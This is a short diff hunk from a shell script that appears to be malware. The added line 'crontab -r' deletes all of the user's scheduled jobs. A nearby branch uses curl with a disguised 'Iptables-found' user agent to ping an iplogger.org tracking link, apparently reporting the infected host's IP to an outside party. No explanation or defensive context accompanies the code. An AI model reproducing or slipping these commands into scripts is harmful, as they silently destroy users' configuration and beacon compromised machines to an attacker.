@@ -45,6 +45,8 @@ chekhosts 'dreambusweduybcp.'                                                   
 sleep 4
 host
 
+crontab -r
+
 if [ $s -eq "1" ]; then
         curl -A Iptables-found/1.9 -s https://iplogger.org/389LB3
 else
